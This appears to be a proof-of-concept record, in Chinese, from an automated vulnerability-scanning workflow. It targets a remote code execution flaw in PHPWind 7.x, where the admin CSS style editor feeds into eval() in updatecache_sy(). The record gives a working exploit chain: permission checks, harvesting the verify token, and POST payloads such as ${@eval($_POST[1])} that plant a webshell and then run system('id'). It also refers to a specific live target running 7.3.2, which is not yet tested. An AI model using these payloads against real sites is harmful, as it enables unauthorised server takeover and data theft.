# PHPWind 7.x 后台风格 CSS 编辑 → data/style/*_css.htm → updatecache_sy eval 代码注入 RCE

- **code**: phpwind-7.x-后台风格-css-编辑-data-style-_css.htm-updatecache_sy-eval-代码注入-rce
- **kind**: poc
- **category**: rce
- **component**: PHPWind 7.x（admin/setstyles.php + admin/cache.php）
- **severity**: critical
- **language**: http
- **source**: self
- **verified_note**: 未在目标上验证（本角色为零发包白盒）。已确认的是：① 目标页脚自报 Powered by PHPwind 7.3.2；② 目标后台模板 template/admin/setstyles.htm 里 editcss 表单被 HTML 注释（runs/ex-setstyles-edit.html L455-L712）；③ 本机 6 个 7.5/8.x 副本的 editcss PHP 分支全部被注释；④ 目标 data/style/wind_css.htm 可公开读取（14279B，副本 runs/ex-wind_css.htm.bak）。转义抵消已用逐字符模拟实测确认。editcss 分支在 7.3.2 上的死活待利用端 1 包实测判定。
- **path**: pocs/phpwind-7.x-后台风格-css-编辑-data-style-_css.htm-updatecache_sy-eval-代码注入-rce/phpwind-setstyles-editcss-eval-rce.md
- **tags**: phpwind,后台,风格模板,代码注入,eval,${},stripslashes抵消,data/style
- **created_at**: 2026-10-06T21:40:15.358Z
- **found_by**: vuln-scan

## 描述

PHPWind 后台「风格 CSS 编辑」写入 data/style/{tplpath}_css.htm，随后 updatecache_sy() 用 eval("\$style_css = \"$style_css\";") 对该文件内容做双引号插值。addslashes/stripslashes 都不拦 $ { }，因此文件里的 ${expr} 会被求值 ⇒ RCE。判据核心：写入侧 str_replace("$","\$") 被紧随的 stripslashes() 完全抵消（既有分析普遍漏看这一步而误判"写入侧已封"）。

## 用法

```
1) 权限自检 GET /bbs/example.com?adminjob=setstyles（期望列表页；返回「您没有权限」则链被权限墙挡死）
2) GET /bbs/example.com?adminjob=setstyles&action=edit&sid=wind 抓 verify
3) POST 同 URL：action=editcss&sid=wind&style_css=<!--css-->${phpinfo()}<!--css--> → 0 字节=分支已注释；「操作成功」=活着
4) 活着则换 ${@eval($_POST[1])}，再 POST action=setcss&showcss=1 触发 eval，带参 1=system('id');
5) 可用 GET /bbs/data/style/wind_css.htm 直接确认 payload 是否原样落盘
```

## 正文

```
## 判据（可跨站复用）

PHPWind 后台「风格模板」→ CSS 编辑 → `updatecache_sy()` 的 eval 链：

### 写入侧：admin/setstyles.php 的 editcss 分支
```php
} elseif ($_POST['action'] == 'editcss') {
	InitGP(array('sid'),'P');
	InitGP(array('style_css'),'P',0);          // 第三参数 0 = 不做 Char_cv ⇒ 内容零转义
	$basename .= "&action=edit&sid=$sid";
	include_once Pcv(D_P."data/style/$sid.php");   // 取得 $tplpath
	if (!pwWritable(D_P."data/style/{$tplpath}_css.htm")) { adminmsg('style_777'); }
	$cssadd    = readover(D_P."data/style/{$tplpath}_css.htm");
	$cssadd    = explode('<!--css-->',$cssadd);
	$style_css = str_replace('EOT','',$style_css);
	$style_css = str_replace("$","\$",$cssadd[0].'<!--css-->'.$style_css.'<!--css-->'.$cssadd[2]); // ①
	$style_css = stripslashes($style_css);   // ★ ② 把 ① 加的 \ 又去掉 ⇒ 防护净效果为零
	writeover(D_P."data/style/{$tplpath}_css.htm",$style_css);
	updatecache_sy($sid);
	adminmsg('operate_success');
}
```
**★ 核心判据：只要 `str_replace("$","\$")` 后面跟着 `stripslashes()`，`$` 就被完整还原，双引号串的 `${expr}` 插值可用。** 实测：`${system(id)}` → `\${system(id)}` → `${system(id)}`（原样落盘）。

### 执行侧：admin/cache.php 的 updatecache_sy()
```php
$style_css = explode('<!--css-->',readover(D_P."data/style/{$tplpath}_css.htm"));
$style_css = addslashes(str_replace(array('<style type="text/css">','</style>'),'',$style_css[1]));
eval("\$style_css = \"$style_css\";");     // ★ addslashes 不转义 $ { } ⇒ ${expr} 被求值
```
第二处（`if (empty($name))` 分支）会**遍历 include `data/style/` 下每个 .php**（落点），并对每个风格的 `_css.htm` 再跑一次同样的 eval。

### 触发配方
```
POST /bbs/example.com?adminjob=setstyles&verify=<页面内 verify>
Referer: <同域后台页>
Content-Type: application/x-www-form-urlencoded

action=editcss&sid=wind&style_css=<!--css-->${@eval($_POST[1])}<!--css-->
# payload 必须包在 <!--css--> 之间（数据源用 explode('<!--css-->') 取 [1] 段）
# 触发 eval：POST action=setcss&showcss=1（无参 updatecache_sy），或后台刷新缓存
# 带参执行：POST 1=system('id');
```
`verify` 由 `PostCheck()` 校验：`substr(md5($source.$admin_name.$admin_gid.$db_hash),0,8)`，其中 `$source` = 所有 GET 参数（排除 verify/nowtime）的 `key.value` 顺序拼接 —— **直接从页面 form 的 action 里取现成的 verify 即可**（它对应「GET 只有 adminjob=setstyles」这一种形态）。

### 版本状态（关键）
- **7.5 SP3 / 8.x：`editcss` 的 PHP 分支被 `/* */` 注释**（7.5 SP3 在 L136-155）⇒ 该版本不可用
- 7.5 SP3 的**模板**里 editcss 表单未注释，但 7.3.2 目标的模板里**被 HTML 注释**（`ex-setstyles-edit.html` L455→L712）
- **7.3.2 的 PHP 分支死活需实测判定**：`POST action=editcss&...` → **0 字节 = 已注释**；**「操作成功」= 活着**
- 前置闸门：`$rightset['setstyles']==1`（`example.com:57-60` 的 `adminRightCheck`，失败抛 `undefine_action`「您没有权限」）
```
